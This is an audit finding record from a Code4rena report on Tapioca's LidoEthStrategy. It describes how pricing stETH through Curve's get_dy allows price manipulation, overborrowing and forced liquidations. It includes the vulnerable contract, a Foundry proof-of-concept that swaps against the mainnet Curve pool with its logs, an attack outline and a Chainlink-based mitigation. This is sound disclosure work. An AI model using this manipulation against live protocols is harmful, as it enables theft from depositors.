{
  "Title": "[H-08] `LidoEthStrategy._currentBalance` is subject to price manipulation, allows overborrowing and liquidations",
  "Content": "\nThe strategy is pricing stETH as ETH by asking the pool for it's return value\n\nThis is easily manipulatable by performing a swap big enough\n\n<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L118-L125>\n\n```solidity\n    function _currentBalance() internal view override returns (uint256 amount) {\n        uint256 stEthBalance = stEth.balanceOf(address(this));\n        uint256 calcEth = stEthBalance > 0\n            ? curveStEthPool.get_dy(1, 0, stEthBalance) // TODO: Prob manipulatable view-reentrancy\n            : 0;\n        uint256 queued = wrappedNative.balanceOf(address(this));\n        return calcEth + queued;\n    }\n\n    /// @dev deposits to Lido or queues tokens if the 'depositThreshold' has not been met yet\n    function _deposited(uint256 amount) internal override nonReentrant {\n        uint256 queued = wrappedNative.balanceOf(address(this));\n        if (queued > depositThreshold) {\n            require(!stEth.isStakingPaused(), \"LidoStrategy: staking paused\");\n            INative(address(wrappedNative)).withdraw(queued);\n            stEth.submit{value: queued}(address(0)); //1:1 between eth<>stEth // TODO: Prob cheaper to buy stETH\n            emit AmountDeposited(queued);\n            return;\n        }\n        emit AmountQueued(amount);\n    }\n```\n\n### POC\n\n*   Imbalance the Pool to overvalue the stETH\n\n*   Overborrow and Make the Singularity Insolvent\n\n*   Imbalance the Pool to undervalue the stETH\n\n*   Liquidate all Depositors (at optimal premium since attacker can control the price change)\n\n### Coded POC\n\nLogs\n\n```python\n[PASS] testSwapStEth() (gas: 372360)\n  Initial Price 5443663537732571417920\n  Changed Price 2187071651284977907921\n  Initial Price 2187071651284977907921\n  Changed Price 1073148438886623970\n```\n\n```python\n[PASS] testSwapETH() (gas: 300192)\nLogs:\n  value 100000000000000000000000\n  Initial Price 5443663537732571417920\n  Changed Price 9755041616702274912586\n  value 700000000000000000000000\n  Initial Price 9755041616702274912586\n  Changed Price 680711874102963551173181\n```\n\nConsidering that swap fees are 1BPS, the attack is profitable at very low TVL\n\n<details>\n\n```solidity\n// SPDX-License Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console2.sol\";\n\ninterface ICurvePoolWeird {\n    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);\n    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);\n}\n\ninterface ICurvePool {\n    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);\n    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);\n\n    function get_virtual_price() external view returns (uint256);\n    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 _min_amount) external;\n\n    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);\n    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function approve(address, uint256) external returns (bool);\n    function transfer(address, uint256) external returns (bool);\n}\n\ncontract Swapper is Test {\n    ICurvePool pool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);\n    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);\n\n    uint256 TEN_MILLION_USD_AS_ETH = 5455e18; // Rule of thumb is 1BPS cost means we can use 5 Billion ETH and still be\n\n    function swapETH() external payable {\n        console2.log(\"value\", msg.value);\n        console2.log(\"Initial Price\", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));\n\n        pool.exchange{value: msg.value}(0, 1, msg.value, 0); // Swap all yolo\n\n        // curveStEthPool.get_dy(1, 0, stEthBalance)\n        console2.log(\"Changed Price\", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));\n\n\n    }\n\n    function swapStEth() external {\n        console2.log(\"Initial Price\", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));\n\n        // Always approve exact ;)\n        uint256 amt = stETH.balanceOf(address(this));\n        stETH.approve(address(pool), stETH.balanceOf(address(this)));\n\n        pool.exchange(1, 0, amt, 0); // Swap all yolo\n\n        // curveStEthPool.get_dy(1, 0, stEthBalance)\n        console2.log(\"Changed Price\", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));\n    }\n\n    receive() external payable {}\n}\n\ncontract CompoundedStakesFuzz is Test {\n    Swapper c;\n    IERC20 token = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);\n\n    function setUp() public {\n        c = new Swapper();\n    }\n\n    function testSwapETH() public {\n        deal(address(this), 100_000e18);\n        c.swapETH{value: 100_000e18}(); /// 100k ETH is enough to double the price\n\n        deal(address(this), 700_000e18);\n        c.swapETH{value: 700_000e18}(); /// 700k ETH is enough to double the price\n    }\n    function testSwapStEth() public {\n        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Has 700k ETH, 100k is sufficient\n        token.transfer(address(c), 100_000e18);\n        c.swapStEth();\n\n        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Another one for good measure\n        token.transfer(address(c), 600_000e18);\n        c.swapStEth();\n    }\n}\n```\n\n</details>\n\n### Mitigation\n\nUse the Chainlink stETH / ETH Price Feed or Ideally do not expose the strategy to any conversion, simply deposit and withdraw stETH directly to avoid any risk or attack in conversions\n\n<https://data.chain.link/arbitrum/mainnet/crypto-eth/steth-eth>\n\n<https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth>\n\n**[0xRektora (Tapioca) confirmed via duplicate issue 828](https://github.com/code-423n4/2023-07-tapioca-findings/issues/828)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-tapioca",
  "Code": [
    {
      "filename": "contracts/lido/LidoEthStrategy.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\nimport \"@boringcrypto/boring-solidity/contracts/BoringOwnable.sol\";\nimport \"@boringcrypto/boring-solidity/contracts/interfaces/IERC20.sol\";\nimport \"@boringcrypto/boring-solidity/contracts/libraries/BoringERC20.sol\";\n\nimport \"tapioca-sdk/dist/contracts/YieldBox/contracts/strategies/BaseStrategy.sol\";\n\nimport \"./interfaces/IStEth.sol\";\nimport \"./interfaces/ICurveEthStEthPool.sol\";\nimport \"../../tapioca-periph/contracts/interfaces/INative.sol\";\n\n/*\n\n__/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\\\\\\\\\\\\\\\\\_______/\\\\\\\\\\_____________/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\____        \n _\\///////\\\\\\/////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__\\/\\\\\\/////////\\\\\\_\\/////\\\\\\///______/\\\\\\///\\\\\\________/\\\\\\////////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__       \n  _______\\/\\\\\\________/\\\\\\/////////\\\\\\_\\/\\\\\\_______\\/\\\\\\_____\\/\\\\\\_______/\\\\\\/__\\///\\\\\\____/\\\\\\/____________/\\\\\\/////////\\\\\\_      \n   _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\\\\\/______\\/\\\\\\______/\\\\\\______\\//\\\\\\__/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\_     \n    _______\\/\\\\\\_______\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\/////////________\\/\\\\\\_____\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_____________\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_    \n     _______\\/\\\\\\_______\\/\\\\\\/////////\\\\\\_\\/\\\\\\_________________\\/\\\\\\_____\\//\\\\\\______/\\\\\\__\\//\\\\\\____________\\/\\\\\\/////////\\\\\\_   \n      _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_________________\\/\\\\\\______\\///\\\\\\__/\\\\\\_____\\///\\\\\\__________\\/\\\\\\_______\\/\\\\\\_  \n       _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\______________/\\\\\\\\\\\\\\\\\\\\\\____\\///\\\\\\\\\\/________\\////\\\\\\\\\\\\\\\\\\_\\/\\\\\\_______\\/\\\\\\_ \n        _______\\///________\\///________\\///__\\///______________\\///////////_______\\/////_____________\\/////////__\\///________\\///__\n*/\n\n//TODO: update withdrawal and currentBalance after Lido allows withdrawals\ncontract LidoEthStrategy is BaseERC20Strategy, BoringOwnable, ReentrancyGuard {\n    using BoringERC20 for IERC20;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    IERC20 public immutable wrappedNative;\n    IStEth public immutable stEth;\n    ICurveEthStEthPool public curveStEthPool;\n\n    /// @notice Queues tokens up to depositThreshold\n    /// @dev When the amount of tokens is greater than the threshold, a deposit operation to AAVE is performed\n    uint256 public depositThreshold;\n\n    // ************** //\n    // *** EVENTS *** //\n    // ************** //\n    event DepositThreshold(uint256 _old, uint256 _new);\n    event AmountQueued(uint256 amount);\n    event AmountDeposited(uint256 amount);\n    event AmountWithdrawn(address indexed to, uint256 amount);\n\n    constructor(\n        IYieldBox _yieldBox,\n        address _token,\n        address _stEth,\n        address _curvePool\n    ) BaseERC20Strategy(_yieldBox, _token) {\n        wrappedNative = IERC20(_token);\n        stEth = IStEth(_stEth);\n        curveStEthPool = ICurveEthStEthPool(_curvePool);\n\n        IERC20(_stEth).approve(_curvePool, type(uint256).max);\n    }\n\n    // ********************** //\n    // *** VIEW FUNCTIONS *** //\n    // ********************** //\n    /// @notice Returns the name of this strategy\n    function name() external pure override returns (string memory name_) {\n        return \"Lido-ETH\";\n    }\n\n    /// @notice Returns the description of this strategy\n    function description()\n        external\n        pure\n        override\n        returns (string memory description_)\n    {\n        return \"Lido-ETH strategy for wrapped native assets\";\n    }\n\n    /// @notice returns compounded amounts in wrappedNative\n    function compoundAmount() public pure returns (uint256 result) {\n        return 0;\n    }\n\n    // *********************** //\n    // *** OWNER FUNCTIONS *** //\n    // *********************** //\n    /// @notice Sets the deposit threshold\n    /// @param amount The new threshold amount\n    function setDepositThreshold(uint256 amount) external onlyOwner {\n        emit DepositThreshold(depositThreshold, amount);\n        depositThreshold = amount;\n    }\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n    function compound(bytes memory) public {}\n\n    /// @notice withdraws everythig from the strategy\n    function emergencyWithdraw() external onlyOwner returns (uint256 result) {\n        compound(\"\");\n\n        uint256 toWithdraw = stEth.balanceOf(address(this));\n        uint256 minAmount = (toWithdraw * 50) / 10_000; //0.5%\n        result = curveStEthPool.exchange(1, 0, toWithdraw, minAmount);\n\n        INative(address(wrappedNative)).deposit{value: result}();\n    }\n\n    // ************************* //\n    // *** PRIVATE FUNCTIONS *** //\n    // ************************* //\n    /// @dev queries Lido and Curve Eth/STEth pools\n    function _currentBalance() internal view override returns (uint256 amount) {\n        uint256 stEthBalance = stEth.balanceOf(address(this));\n        uint256 calcEth = stEthBalance > 0\n            ? curveStEthPool.get_dy(1, 0, stEthBalance)\n            : 0;\n        uint256 queued = wrappedNative.balanceOf(address(this));\n        return calcEth + queued;\n    }\n\n    /// @dev deposits to Lido or queues tokens if the 'depositThreshold' has not been met yet\n    function _deposited(uint256 amount) internal override nonReentrant {\n        uint256 queued = wrappedNative.balanceOf(address(this));\n        if (queued > depositThreshold) {\n            require(!stEth.isStakingPaused(), \"LidoStrategy: staking paused\");\n            INative(address(wrappedNative)).withdraw(queued);\n            stEth.submit{value: queued}(address(0)); //1:1 between eth<>stEth\n            emit AmountDeposited(queued);\n            return;\n        }\n        emit AmountQueued(amount);\n    }\n\n    /// @dev swaps StEth with Eth\n    function _withdraw(\n        address to,\n        uint256 amount\n    ) internal override nonReentrant {\n        uint256 available = _currentBalance();\n        require(available >= amount, \"LidoStrategy: amount not valid\");\n\n        uint256 queued = wrappedNative.balanceOf(address(this));\n        if (amount > queued) {\n            uint256 toWithdraw = amount - queued; //1:1 between eth<>stEth\n            uint256 minAmount = toWithdraw - (toWithdraw * 250) / 10_000; //2.5%\n            uint256 obtainedEth = curveStEthPool.exchange(\n                1,\n                0,\n                toWithdraw,\n                minAmount\n            );\n\n            INative(address(wrappedNative)).deposit{value: obtainedEth}();\n        }\n        queued = wrappedNative.balanceOf(address(this));\n        require(queued >= amount, \"LidoStrategy: not enough\");\n\n        wrappedNative.safeTransfer(to, amount);\n\n        emit AmountWithdrawn(to, amount);\n    }\n\n    receive() external payable {}\n}"
    }
  ]
}